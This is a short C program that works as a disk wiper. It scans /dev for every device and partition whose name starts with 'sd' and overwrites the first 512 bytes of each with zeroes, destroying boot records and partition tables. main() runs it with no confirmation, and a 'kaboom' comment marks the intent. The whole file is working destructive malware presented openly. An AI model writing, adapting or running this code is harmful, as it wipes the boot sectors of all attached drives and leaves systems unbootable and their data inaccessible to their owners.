#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>

#define MBR_SIZE 512 // size of the mbr, so where to find it in the PhysicalDrive

// function to write zeroes to the MBR of the given drive
void write_zero_mbr(const char *device) {
    unsigned char buffer[MBR_SIZE] = {0};  // initialize buffer with 0s

    int fd = open(device, O_WRONLY);
    if (fd < 0) {
        perror("failed to open disk");
        return;
    }

    write(fd, buffer, MBR_SIZE);  // write the zero buffer to the disk
    close(fd);

    printf("wrote zeroes to mbr of %s\n", device);
}

// detect all physical drives and write zeroes to their MBR
void detect_linux_drives() {
    DIR *dir = opendir("/dev");
    if (!dir) {
        perror("failed to open /dev directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // look for drives like /dev/sda, /dev/sdb, etc.
        if (strncmp(entry->d_name, "sd", 2) == 0) {
            char device[64];
            snprintf(device, sizeof(device), "/dev/%s", entry->d_name);
            write_zero_mbr(device);  // write to the drive
        }
    }

    closedir(dir);
}

int main() {
    detect_linux_drives();  // kaboom
    return 0;
}
